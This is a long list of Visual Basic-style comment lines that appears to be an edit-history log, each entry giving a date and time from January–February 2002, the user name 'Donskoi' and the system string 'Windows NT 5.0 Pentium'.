'Windows NT 5.0 Pentium


'27.01.2002 23:02:15
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:02:16
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:02:30
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:02:32
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:02:50
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:04:02
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:04:04
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:04:26
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:04:27
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:04:59
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:05:00
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:05:29
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:05:31
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:23:55
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:23:57
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:47:26
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:47:59
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:48:01
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 23:48:15
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 0:04:32
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 0:04:53
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 0:05:36
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 0:05:46
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 0:06:40
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 0:09:25
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 0:10:25
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 0:10:39
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 5:44:48
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:04:44
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:04:46
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:08:22
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:08:36
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:14:36
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:14:38
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:19:44
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:19:46
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:29:19
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:29:21
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:30:42
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:30:44
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:33:35
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 6:33:37
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 8:56:46
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 8:56:48
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 8:57:44
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 8:57:46
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 8:58:22
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 8:58:25
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 8:58:52
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 9:00:46
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 9:00:48
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 9:01:24
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 9:03:47
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 9:04:49
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 9:04:51
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 9:05:07
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 9:05:09
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 9:05:19
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 9:05:21
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 10:03:26
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 10:03:28
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 10:05:09
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 10:05:11
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 10:09:04
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 10:09:06
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 10:09:48
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 10:13:21
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 10:14:07
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 10:14:09
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:17:14
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:19:37
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:20:24
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:29:24
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:32:22
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:34:24
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:38:12
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:38:24
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:39:09
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:39:19
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:48:53
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:48:55
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:49:20
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:49:22
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 11:55:00
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:19:28
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:21:50
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:26:43
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:27:22
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:31:16
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:32:13
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:32:46
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:34:49
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:35:04
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:35:37
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:35:51
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:36:11
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:36:23
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:36:42
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:36:53
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:37:04
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:37:19
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:37:33
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:37:42
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:40:33
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:42:31
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:48:21
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:52:58
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 12:58:04
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 13:00:23
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 13:00:25
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 13:00:37
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 13:01:32
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 13:11:23
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 13:12:42
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 13:14:10
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 13:16:40
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:10:39
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:11:04
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:13:11
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:18:31
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:21:49
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:40:36
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:41:28
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:41:50
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:42:19
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:42:38
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:43:13
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:43:34
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:44:12
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:44:45
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:45:05
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:45:35
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:45:57
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:46:26
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:46:48
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:47:20
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:47:47
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:48:23
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:48:37
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:48:57
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:49:24
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:49:42
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:50:11
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:50:28
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:51:06
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 14:51:22
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:17:21
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:18:44
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:18:56
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:21:45
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:22:15
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:22:29
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:23:10
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:43:27
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:53:45
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:56:13
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:57:33
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:58:58
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:59:15
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 15:59:30
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:06:42
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:07:14
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:07:29
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:07:48
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:10:32
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:10:52
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:11:28
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:11:44
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:12:40
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:13:36
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:15:21
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:16:44
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:17:34
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:23:32
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:23:41
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:25:04
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:32:51
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:34:36
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:36:34
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:38:17
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 16:41:17
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 17:16:20
'Donskoi
'Windows NT 5.0 Pentium


'28.01.2002 17:18:29
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:24:42
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:25:42
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:25:59
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:26:19
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:26:47
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:27:04
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:27:52
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:28:55
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:32:00
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:32:08
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:32:39
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:33:16
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 14:36:48
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 16:44:37
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 16:44:54
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 16:45:45
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 16:46:14
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 16:48:12
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 17:09:21
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 17:26:52
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 17:55:59
'Donskoi
'Windows NT 5.0 Pentium


'16.02.2002 21:09:20
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 2:11:05
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 2:31:24
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 2:36:52
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 2:38:11
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 3:10:02
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 3:21:59
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 3:35:11
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 3:42:28
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 5:52:45
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 5:53:23
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 5:53:25
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 5:55:04
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 5:59:07
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:26:06
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:34:49
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:35:28
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:48:12
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:48:36
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:49:08
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:49:26
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:53:33
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:53:50
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:54:06
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:54:23
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:55:00
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 6:55:02
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 7:01:48
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 9:44:50
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 9:51:16
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 9:54:06
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 11:58:18
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 11:59:48
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 12:00:02
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 12:00:14
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 12:01:26
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 12:01:37
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 12:03:59
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 12:06:00
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 12:14:32
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 12:15:12
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 12:15:13
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 12:51:44
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 13:51:23
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 13:52:05
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 13:52:41
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 13:52:52
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 13:52:59
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 13:55:16
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 13:55:24
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 13:56:11
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 17:20:18
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 17:20:19
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 21:40:58
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 23:13:25
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 23:16:28
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 23:17:38
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 23:28:23
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 23:28:42
'Donskoi
'Windows NT 5.0 Pentium


'17.02.2002 23:29:05
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:07:49
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:08:48
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:22:21
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:23:18
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:25:17
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:25:19
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:26:26
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:26:28
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:27:30
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:27:32
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:28:46
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:28:56
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:37:31
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:39:03
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:40:01
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:40:36
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:40:46
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:41:06
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:41:14
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:41:21
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:44:28
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:45:03
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:45:15
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:46:02
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:46:19
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:47:54
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:48:03
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:54:08
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:54:28
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:55:06
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:55:40
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:56:30
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:57:07
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:58:02
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:58:23
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 3:59:44
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:00:19
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:00:54
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:04:09
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:04:22
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:04:43
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:05:30
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:05:49
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:06:01
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:06:16
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:07:52
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:08:49
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:09:28
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:10:15
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:10:26
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:11:22
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:12:10
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:13:57
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:13:59
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:15:25
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:15:26
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:18:22
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:19:11
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:25:38
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:28:11
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:29:00
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:29:07
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:30:00
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:30:20
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:30:33
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:30:42
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:31:03
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:31:15
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:31:28
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:31:48
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:31:55
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:32:21
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:32:30
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:32:40
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:34:23
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:35:56
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:37:11
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:37:45
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:38:15
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:38:50
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:39:28
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:40:08
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:41:03
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:41:11
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:41:23
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:41:32
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:44:06
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:44:27
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:45:32
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:46:00
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:46:36
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:48:14
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:48:28
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:48:46
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:52:37
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:52:53
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:53:12
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:53:43
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:53:57
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:54:29
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:54:52
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:55:13
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:55:23
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:55:49
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:56:25
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:57:13
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:57:47
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 4:59:43
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:05:56
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:06:20
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:06:37
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:16:00
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:16:11
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:16:13
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:16:36
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:17:59
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:18:20
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:18:28
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:18:29
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:19:08
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:20:20
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:20:39
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:21:12
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:23:48
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:24:19
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:25:37
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:27:03
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:29:11
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:30:18
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:31:03
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:31:16
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:31:18
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:31:57
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:31:59
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:32:07
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:32:09
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:32:22
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:32:37
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:54:56
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 5:57:15
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 6:04:21
'Donskoi
